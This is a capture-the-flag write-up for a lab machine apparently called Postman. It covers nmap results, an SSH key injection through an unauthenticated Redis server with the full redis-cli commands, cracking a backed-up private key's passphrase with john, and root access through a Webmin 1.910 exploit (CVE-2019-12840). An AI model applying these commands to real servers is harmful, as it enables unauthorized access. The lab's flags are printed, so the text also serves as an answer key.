# 10.129.2.1

## NMAP
```
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 46834ff13861c01c74cbb5d14a684d77 (RSA)
|   256 2d8d27d2df151a315305fbfff0622689 (ECDSA)
|_  256 ca7c82aa5ad372ca8b8a383a8041a045 (ED25519)
80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: The Cyber Geek's Personal Website
|_http-server-header: Apache/2.4.29 (Ubuntu)
6379/tcp  open  redis   Redis key-value store 4.0.9
10000/tcp open  http    MiniServ 1.910 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## FootHold
- enumerating the website at 80
    - http://postman.htb/upload/ - directory listing (can get a webshell if we can upload here)
    - no vhosts
- enumerating redis - https://hackviser.com/tactics/pentesting/services/redis
    - no keys present - `KEYS *`
    - no passwords in `CONFIG GET *`
    - tried uploading webshell but that didnt work (no access to dir mostly)
- SSH KEY INJECTION on REDIS
```
# Generate SSH key
ssh-keygen -t rsa -f redis_key

# Prepare key with newlines
(echo -e "\n\n"; cat redis_key.pub; echo -e "\n\n") > key.txt

# Inject into authorized_keys
redis-cli -h postman.htb flushall
cat key.txt | redis-cli -h postman.htb -x set ssh_key
redis-cli -h postman.htb config set dbfilename authorized_keys
redis-cli -h postman.htb config set dir /var/lib/redis/.ssh
redis-cli -h postman.htb save

# Connect via SSH
```
- `ssh -i redis_key root@postman.htb` works
- there is a user Matt, but we cannot access his files.
- `sudo -l` - we dont have the pass
    - `su Matt` no pass
- ran `linpeas.sh`
    - `/usr/share/webin` - blue-theme, gray theme, postfix files?
    - `/etc/webmin`
    - `/usr/bin/perl /usr/share/webmin/miniserv.pl /etc/webmin/miniserv.conf`
    - `Sudo version 1.8.21p2`
- found an `id_rsa.bak` in `/opt`
    - fuck me. I didnt check this because I thought some other user made this.
    - it belongs to Matt.
    - scp this to kali
- `ssh2john id_rsa.bak > matt.hash`
    - `john matt.hash` - `computer2008`
- `ssh -i id_rsa.bak matt@psotman.htb` enter passphrase. does not work
    - tried with `-t --no-profile` if there is no profile for Matt.
- in redis ssh session - `su matt` and enter `computer2008`
- get user.txt - `adca5dbd39164c7844296c888da0bc23`

## PrivEsc
- ran linpeas.sh
- /usr/share/webmin/postfix /etc/webmin/exports
- /etc/skel/.bash
- found webmin version 1.910
    - privvy to unauthenticated rce - package upload (CVE-2019-12840)
- login into the webmin app at postman.htb:10000 using `Matt:computer2008`
- using metasploit get root shell and root.txt - c64091bc8979c8ff16e22ca0b95add45 
